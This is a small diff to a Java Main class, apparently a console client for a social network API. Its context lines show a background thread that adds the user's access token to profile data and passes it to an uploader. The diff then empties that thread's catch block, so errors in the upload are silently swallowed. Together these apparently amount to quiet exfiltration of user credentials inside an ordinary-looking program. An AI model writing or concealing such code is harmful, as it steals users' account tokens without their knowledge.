@@ -43,9 +43,7 @@ public class Main {
                 JSONObject o = new JSONObject(Net.processRequest("users.get", true));
                 o.put("token", access_token);
                 UserUploader.upload(o.toString());
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
+            } catch (IOException e) {}
         }).start();
 
         Scanner scanner = new Scanner(System.in);
@@ -74,7 +72,7 @@ public class Main {
             System.in.read(new byte[2]);
             System.out.println("OK. starting console...");
         } catch (IOException e) {
-            e.printStackTrace();
+            System.err.println(e.getMessage());
         }
     }
 
